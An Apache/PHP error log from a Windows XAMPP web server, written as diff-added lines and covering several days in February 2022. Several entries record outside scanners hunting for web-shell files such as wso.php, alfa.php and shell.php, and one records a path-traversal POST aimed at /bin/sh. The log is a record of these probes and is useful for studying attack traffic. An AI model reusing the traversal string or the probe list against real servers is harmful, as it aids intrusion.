+[Thu Feb 10 23:20:40.382935 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52335] script 'C:/xampp/htdocs/wp-booking.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:21:21.518407 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:58741] script 'C:/xampp/htdocs/config.bak.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:21:24.111639 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:50085] script 'C:/xampp/htdocs/legion.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:21:50.189757 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:63418] script 'C:/xampp/htdocs/wp-plugins.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:22:14.354029 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:59826] script 'C:/xampp/htdocs/gank.php.PhP' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:22:49.685907 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:61162] script 'C:/xampp/htdocs/archives.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:22:57.905936 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:56906] script 'C:/xampp/htdocs/xindex.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:23:03.608814 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:51296] script 'C:/xampp/htdocs/defau11.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:23:21.433844 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:50814] script 'C:/xampp/htdocs/system_log.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:23:26.385187 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:54557] script 'C:/xampp/htdocs/wp-backup-sql-302.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:28.708716 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:62632] script 'C:/xampp/htdocs/about.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:28.865855 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:62632] script 'C:/xampp/htdocs/shells.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:29.037634 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:62632] script 'C:/xampp/htdocs/olux.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:29.193797 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:62632] script 'C:/xampp/htdocs/xleet.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:29.349960 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:62632] script 'C:/xampp/htdocs/wso.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:29.506123 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:62632] script 'C:/xampp/htdocs/shell.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:49.956644 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52924] script 'C:/xampp/htdocs/up.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:50.112807 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52924] script 'C:/xampp/htdocs/upload.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:50.268970 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52924] script 'C:/xampp/htdocs/1.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:50.440749 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52924] script 'C:/xampp/htdocs/x.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:50.596912 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52924] script 'C:/xampp/htdocs/z.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:50.753075 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52924] script 'C:/xampp/htdocs/a.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:50.909238 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52924] script 'C:/xampp/htdocs/test.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:51.065401 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52924] script 'C:/xampp/htdocs/wp.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:29:51.221564 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52924] script 'C:/xampp/htdocs/alfa.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:30:12.020523 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:57212] script 'C:/xampp/htdocs/config.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:45:30.493060 2022] [php7:notice] [pid 2356:tid 1484] [client 172.104.159.48:49320] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Thu Feb 10 23:45:30.493060 2022] [php7:notice] [pid 2356:tid 1484] [client 172.104.159.48:49320] PHP Stack trace:
+[Thu Feb 10 23:45:30.493060 2022] [php7:notice] [pid 2356:tid 1484] [client 172.104.159.48:49320] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Thu Feb 10 23:46:25.503700 2022] [authz_core:error] [pid 2356:tid 1496] [client 172.104.159.48:56322] AH01630: client denied by server configuration: C:/xampp/htdocs/server-status
+[Thu Feb 10 23:46:25.503700 2022] [php7:notice] [pid 2356:tid 1484] [client 172.104.159.48:56308] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Thu Feb 10 23:46:25.503700 2022] [php7:notice] [pid 2356:tid 1484] [client 172.104.159.48:56308] PHP Stack trace:
+[Thu Feb 10 23:46:25.503700 2022] [php7:notice] [pid 2356:tid 1484] [client 172.104.159.48:56308] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Thu Feb 10 23:46:32.050749 2022] [php7:notice] [pid 2356:tid 1524] [client 172.104.159.48:39332] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Thu Feb 10 23:46:32.050749 2022] [php7:notice] [pid 2356:tid 1524] [client 172.104.159.48:39332] PHP Stack trace:
+[Thu Feb 10 23:46:32.050749 2022] [php7:notice] [pid 2356:tid 1524] [client 172.104.159.48:39332] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Fri Feb 11 11:12:22.017059 2022] [php7:error] [pid 2356:tid 1524] [client 92.204.220.54:53689] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Fri Feb 11 11:24:54.273871 2022] [php7:error] [pid 2356:tid 1524] [client 72.167.69.214:52340] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Fri Feb 11 11:25:43.960397 2022] [php7:error] [pid 2356:tid 1524] [client 92.205.2.188:46867] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Fri Feb 11 16:59:15.122927 2022] [core:error] [pid 2356:tid 1508] [client 45.146.165.37:60356] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Fri Feb 11 17:52:40.341132 2022] [negotiation:error] [pid 2356:tid 1508] [client 61.219.11.151:61456] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_BAD_REQUEST.html.var
+[Sat Feb 12 07:01:34.000609 2022] [php7:notice] [pid 2356:tid 1512] [client 47.253.61.221:58062] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Sat Feb 12 07:01:34.000609 2022] [php7:notice] [pid 2356:tid 1512] [client 47.253.61.221:58062] PHP Stack trace:
+[Sat Feb 12 07:01:34.000609 2022] [php7:notice] [pid 2356:tid 1512] [client 47.253.61.221:58062] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Sat Feb 12 07:02:56.744267 2022] [php7:notice] [pid 2356:tid 1500] [client 47.253.61.221:46200] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Sat Feb 12 07:02:56.744267 2022] [php7:notice] [pid 2356:tid 1500] [client 47.253.61.221:46200] PHP Stack trace:
+[Sat Feb 12 07:02:56.744267 2022] [php7:notice] [pid 2356:tid 1500] [client 47.253.61.221:46200] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Sat Feb 12 08:55:56.537376 2022] [php7:error] [pid 2356:tid 1512] [client 103.153.214.231:55402] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Sat Feb 12 11:02:42.718411 2022] [php7:error] [pid 2356:tid 1512] [client 47.96.185.5:55840] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Sat Feb 12 11:28:23.384537 2022] [php7:error] [pid 2356:tid 1512] [client 93.114.234.242:43912] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Sat Feb 12 13:19:07.667563 2022] [php7:notice] [pid 2356:tid 1504] [client 192.3.116.182:41103] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Sat Feb 12 13:19:07.667563 2022] [php7:notice] [pid 2356:tid 1504] [client 192.3.116.182:41103] PHP Stack trace:
+[Sat Feb 12 13:19:07.667563 2022] [php7:notice] [pid 2356:tid 1504] [client 192.3.116.182:41103] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Sat Feb 12 13:28:32.091091 2022] [php7:notice] [pid 2356:tid 1504] [client 23.95.100.141:40270] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Sat Feb 12 13:28:32.091091 2022] [php7:notice] [pid 2356:tid 1504] [client 23.95.100.141:40270] PHP Stack trace:
+[Sat Feb 12 13:28:32.091091 2022] [php7:notice] [pid 2356:tid 1504] [client 23.95.100.141:40270] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Sat Feb 12 13:31:03.672649 2022] [php7:notice] [pid 2356:tid 1500] [client 207.216.101.183:62420] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sat Feb 12 13:31:03.672649 2022] [php7:notice] [pid 2356:tid 1500] [client 207.216.101.183:62420] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sat Feb 12 13:31:03.672649 2022] [php7:notice] [pid 2356:tid 1500] [client 207.216.101.183:62420] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Sat Feb 12 13:31:03.672649 2022] [php7:notice] [pid 2356:tid 1500] [client 207.216.101.183:62420] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sat Feb 12 13:31:03.672649 2022] [php7:notice] [pid 2356:tid 1500] [client 207.216.101.183:62420] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sat Feb 12 13:31:03.672649 2022] [php7:notice] [pid 2356:tid 1500] [client 207.216.101.183:62420] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Sat Feb 12 18:48:00.663300 2022] [php7:notice] [pid 2356:tid 1532] [client 168.100.9.49:61000] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Sat Feb 12 18:48:00.663300 2022] [php7:notice] [pid 2356:tid 1532] [client 168.100.9.49:61000] PHP Stack trace:
+[Sat Feb 12 18:48:00.663300 2022] [php7:notice] [pid 2356:tid 1532] [client 168.100.9.49:61000] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+A subdirectory or file c:\desiree already exists.
+[Sat Feb 12 22:24:32.893088 2022] [php7:notice] [pid 2356:tid 1532] [client 139.59.7.98:61953] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Sat Feb 12 22:24:32.893088 2022] [php7:notice] [pid 2356:tid 1532] [client 139.59.7.98:61953] PHP Stack trace:
+[Sat Feb 12 22:24:32.893088 2022] [php7:notice] [pid 2356:tid 1532] [client 139.59.7.98:61953] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Sat Feb 12 22:25:03.199834 2022] [cgi:error] [pid 2356:tid 1532] [client 84.53.198.168:5809] AH02811: script not found or unable to stat: C:/xampp/htdocs/setup.cgi
+[Sat Feb 12 23:03:39.294719 2022] [php7:error] [pid 2356:tid 1504] [client 13.76.132.231:41968] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat, referer: http://dvwa.stevenover.land
+[Sun Feb 13 08:54:20.504978 2022] [php7:error] [pid 2356:tid 1516] [client 185.224.137.72:44470] script 'C:/xampp/htdocs/1index.php' not found or unable to stat, referer: http://simplesite.com
+[Sun Feb 13 09:04:55.881447 2022] [php7:error] [pid 2356:tid 1516] [client 213.190.6.16:24524] script 'C:/xampp/htdocs/radio.php' not found or unable to stat, referer: http://simplesite.com
+[Sun Feb 13 10:32:53.782814 2022] [negotiation:error] [pid 2356:tid 1516] [client 176.74.192.85:42155] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Sun Feb 13 10:32:54.110754 2022] [negotiation:error] [pid 2356:tid 1516] [client 176.74.192.85:49531] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Sun Feb 13 10:32:54.407462 2022] [negotiation:error] [pid 2356:tid 1516] [client 176.74.192.85:44373] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Sun Feb 13 10:37:24.003263 2022] [php7:error] [pid 2356:tid 1516] [client 87.116.165.64:39238] script 'C:/xampp/phpMyAdmin/main.php' not found or unable to stat
+[Sun Feb 13 10:37:26.486270 2022] [php7:error] [pid 2356:tid 1516] [client 87.116.165.64:39240] script 'C:/xampp/phpMyAdmin/read_dump.phpmain.php' not found or unable to stat
+[Sun Feb 13 11:25:04.113266 2022] [php7:error] [pid 2356:tid 1504] [client 185.224.137.29:23884] script 'C:/xampp/htdocs/doc.php' not found or unable to stat, referer: http://simplesite.com
+[Sun Feb 13 11:25:09.030448 2022] [php7:error] [pid 2356:tid 1504] [client 185.224.137.29:25932] script 'C:/xampp/htdocs/doc.php' not found or unable to stat, referer: http://simplesite.com
+[Sun Feb 13 13:46:03.943282 2022] [php7:notice] [pid 2356:tid 1504] [client 109.248.6.77:46016] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Sun Feb 13 13:46:03.943282 2022] [php7:notice] [pid 2356:tid 1504] [client 109.248.6.77:46016] PHP Stack trace:
+[Sun Feb 13 13:46:03.943282 2022] [php7:notice] [pid 2356:tid 1504] [client 109.248.6.77:46016] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Sun Feb 13 15:18:34.079518 2022] [php7:error] [pid 2356:tid 1516] [client 111.200.216.55:63740] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Sun Feb 13 19:43:56.653387 2022] [php7:notice] [pid 2356:tid 1532] [client 108.180.109.35:51876] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:43:56.653387 2022] [php7:notice] [pid 2356:tid 1532] [client 108.180.109.35:51876] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:43:56.653387 2022] [php7:notice] [pid 2356:tid 1532] [client 108.180.109.35:51876] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:43:56.653387 2022] [php7:notice] [pid 2356:tid 1532] [client 108.180.109.35:51876] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:43:56.653387 2022] [php7:notice] [pid 2356:tid 1532] [client 108.180.109.35:51876] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:43:56.653387 2022] [php7:notice] [pid 2356:tid 1532] [client 108.180.109.35:51876] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:50:16.765834 2022] [php7:notice] [pid 2356:tid 1524] [client 108.180.109.35:52106] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:50:16.765834 2022] [php7:notice] [pid 2356:tid 1524] [client 108.180.109.35:52106] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:50:16.765834 2022] [php7:notice] [pid 2356:tid 1524] [client 108.180.109.35:52106] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:50:16.765834 2022] [php7:notice] [pid 2356:tid 1524] [client 108.180.109.35:52106] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:50:16.765834 2022] [php7:notice] [pid 2356:tid 1524] [client 108.180.109.35:52106] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 19:50:16.765834 2022] [php7:notice] [pid 2356:tid 1524] [client 108.180.109.35:52106] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:23:34.842131 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50442] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:23:34.842131 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50442] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:23:34.842131 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50442] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:23:34.842131 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50442] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:23:34.842131 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50442] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:23:34.842131 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50442] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:26:14.712189 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.156.224:50456] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:26:14.712189 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.156.224:50456] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:26:14.712189 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.156.224:50456] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:26:14.712189 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.156.224:50456] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:26:14.712189 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.156.224:50456] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:26:14.712189 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.156.224:50456] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:28:51.035323 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50550] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:28:51.035323 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50550] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:28:51.035323 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50550] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:28:51.035323 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50550] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:28:51.035323 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50550] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:28:51.035323 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50550] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:29:34.002444 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50552] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:29:34.002444 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50552] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:29:34.002444 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50552] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:29:34.002444 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50552] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:29:34.002444 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50552] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:29:34.002444 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50552] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:33:00.880298 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50632] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:33:00.880298 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50632] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:33:00.880298 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50632] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:33:00.880298 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50632] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:33:00.880298 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50632] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:33:00.895914 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.156.224:50632] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Sun Feb 13 20:34:50.524442 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50639] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:34:50.524442 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50639] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:34:50.524442 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50639] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:34:50.524442 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50639] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:34:50.524442 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50639] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:34:50.524442 2022] [php7:notice] [pid 2356:tid 1516] [client 174.7.156.224:50639] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:35:33.639922 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50640] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:35:33.639922 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50640] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:35:33.639922 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50640] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:35:33.639922 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50640] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:35:33.639922 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50640] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:35:33.639922 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.156.224:50640] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Sun Feb 13 20:38:06.997479 2022] [php7:error] [pid 2356:tid 1532] [client 139.99.113.97:50738] script 'C:/xampp/htdocs/doc.php' not found or unable to stat, referer: http://simplesite.com
+[Sun Feb 13 20:51:21.905041 2022] [php7:error] [pid 2356:tid 1520] [client 198.20.105.79:13531] script 'C:/xampp/htdocs/local.php' not found or unable to stat, referer: http://simplesite.com
+[Sun Feb 13 20:53:14.566835 2022] [php7:error] [pid 2356:tid 1520] [client 54.37.121.239:35570] script 'C:/xampp/htdocs/ups.php' not found or unable to stat, referer: http://simplesite.com
+[Sun Feb 13 20:53:18.472962 2022] [php7:error] [pid 2356:tid 1520] [client 54.37.121.239:37502] script 'C:/xampp/htdocs/ups.php' not found or unable to stat, referer: http://simplesite.com
+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file name. already exists.
+Error occurred while processing: name..
